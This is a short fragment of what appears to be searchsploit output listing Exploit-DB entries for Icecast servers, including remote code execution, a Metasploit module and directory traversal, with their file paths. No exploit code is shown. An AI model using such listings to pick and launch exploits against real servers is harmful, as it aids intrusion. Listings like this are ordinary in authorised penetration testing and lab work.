Icecast 2.0.1 (Win32) - Remote Code Execution (2)                | windows/remote/573.c
Icecast 2.0.1 (Windows x86) - Header Overwrite (Metasploit)      | windows_x86/remote/16763.rb
Icecast 2.x - XSL Parser Multiple Vulnerabilities                | multiple/remote/25238.txt
icecast server 1.3.12 - Directory Traversal Information Disclosu | linux/remote/21602.txt
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
